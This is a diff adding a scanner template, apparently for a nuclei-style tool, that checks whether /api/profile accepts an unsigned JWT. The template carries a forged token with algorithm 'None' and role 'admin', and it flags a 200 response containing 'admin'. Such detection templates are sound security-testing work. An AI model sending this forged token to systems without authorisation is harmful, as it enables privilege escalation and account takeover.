@@ -1,0 +1,22 @@
+id: jwt2-02
+name: 'JWT None kid key-101'
+severity: critical
+type: active
+tags:
+  - jwt
+  - auth
+  - none
+description: 'Unsigned token accepted on /api/profile'
+requests:
+  - method: GET
+    path: '{{BaseURL}}/api/profile'
+    match-all: true
+    sendHeaders:
+      Authorization: 'Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIiwia2lkIjoia2V5LTEwMSJ9.eyJzdWIiOiJ1MSIsInJvbGUiOiJhZG1pbiJ9.'
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - 'admin'
